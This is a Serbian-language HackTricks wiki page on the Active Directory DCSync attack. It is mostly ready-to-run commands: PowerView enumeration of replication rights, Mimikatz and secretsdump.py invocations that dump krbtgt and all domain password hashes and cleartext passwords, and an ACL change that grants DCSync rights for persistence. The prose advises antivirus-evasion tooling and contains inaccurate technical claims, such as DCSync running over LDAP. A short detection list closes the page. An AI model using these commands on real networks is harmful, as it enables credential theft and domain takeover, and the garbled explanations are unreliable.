# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** uz pomoć najnaprednijih alata zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## DCSync

Dozvola **DCSync** podrazumeva da imate ove dozvole nad samim domenom: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** i **Replicating Directory Changes In Filtered Set**.

**Važne napomene o DCSync-u:**

* Napad **DCSync simulira ponašanje kontrolera domena i traži od drugih kontrolera domena da replikuju informacije** koristeći protokol za udaljenu replikaciju direktorijuma (MS-DRSR). Budući da je MS-DRSR važeća i neophodna funkcija Active Directory-ja, ne može se isključiti ili onemogućiti.
* Podrazumevano, samo grupe **Domain Admins, Enterprise Admins, Administrators i Domain Controllers** imaju potrebne privilegije.
* Ako su lozinke bilo kojeg naloga sačuvane sa reverzibilnom enkripcijom, opcija je dostupna u alatu Mimikatz da se lozinka vrati u čistom tekstu.

### Enumeracija

Proverite ko ima ove dozvole koristeći `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Iskoristite lokalno

Da biste iskoristili ovu tehniku, morate imati pristup lokalnom računaru unutar mreže koju želite da napadnete. Ova metoda se naziva DCSync i omogućava vam da izvučete NTLM hash-ove korisničkih naloga iz Active Directory domenskog kontrolera.

Evo koraka koje treba da preduzmete da biste iskoristili ovu tehniku:

1. Prijavite se na lokalni računar sa administratorskim privilegijama.
2. Pokrenite alat "mimikatz" na lokalnom računaru.
3. Unesite komandu `lsadump::dcsync /user:<korisničko_ime>` da biste izvukli NTLM hash za određeni korisnički nalog. Zamijenite `<korisničko_ime>` sa stvarnim korisničkim imenom.
4. NTLM hash će biti prikazan na ekranu. Možete ga koristiti za dalje napade, kao što je "pass-the-hash" napad.

Važno je napomenuti da je za ovu tehniku potrebno da imate administratorske privilegije na lokalnom računaru. Takođe, ova metoda može biti otkrivena od strane antivirusnih programa, pa je preporučljivo koristiti alate koji su dizajnirani za zaobilaženje antivirusne zaštite.
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Eksploatacija na daljinu

DCSync može biti iskorišćen na daljinu ako je omogućen pristup LDAP servisu na ciljnom Active Directory kontroleru domena (DC). Da biste iskoristili ovu ranjivost, potrebno je da imate odgovarajuće privilegije na ciljnom DC-u.

Da biste izvršili DCSync na daljinu, možete koristiti alate kao što su `mimikatz` ili `secretsdump.py`. Ovi alati omogućavaju izvršavanje DCSync operacije preko LDAP-a, čime se omogućava povlačenje NTLM hashova korisničkih naloga sa ciljnog DC-a.

Kada dobijete NTLM hashove, možete ih koristiti za daljnje napade kao što su "pass-the-hash" ili "pass-the-ticket" napadi. Takođe, ovi hashovi mogu biti iskorišćeni za dešifrovanje lozinki korisničkih naloga.

Važno je napomenuti da je za izvršavanje DCSync operacije na daljinu potrebno da ciljni DC ima omogućenu replikaciju NTDS (NT Directory Services) baze podataka preko LDAP-a. Ako je replikacija onemogućena, DCSync operacija neće biti uspešna.
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` generiše 3 datoteke:

* jednu sa **NTLM heševima**
* jednu sa **Kerberos ključevima**
* jednu sa čistim tekstom lozinki iz NTDS-a za sve naloge koji su podešeni sa [**reverzibilnom enkripcijom**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) omogućenom. Možete dobiti korisnike sa reverzibilnom enkripcijom pomoću

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Upornost

Ako ste domenski administrator, možete dodeliti ova ovlašćenja bilo kom korisniku uz pomoć `powerview`-a:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Zatim, možete **proveriti da li je korisnik pravilno dodeljen** 3 privilegije tako što ćete ih potražiti u izlazu (trebali biste videti imena privilegija unutar polja "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Obezbeđivanje

* Bezbednosni događaj ID 4662 (Mora biti omogućena politika nadzora za objekat) - Izvršena je operacija nad objektom
* Bezbednosni događaj ID 5136 (Mora biti omogućena politika nadzora za objekat) - Izmenjen je objekat direktorijumskog servisa
* Bezbednosni događaj ID 4670 (Mora biti omogućena politika nadzora za objekat) - Promenjena su dozvole na objektu
* AD ACL Scanner - Kreirajte i uporedite izveštaje o ACL-ovima. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Reference

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju oglašenu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali tokove rada** pokretane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
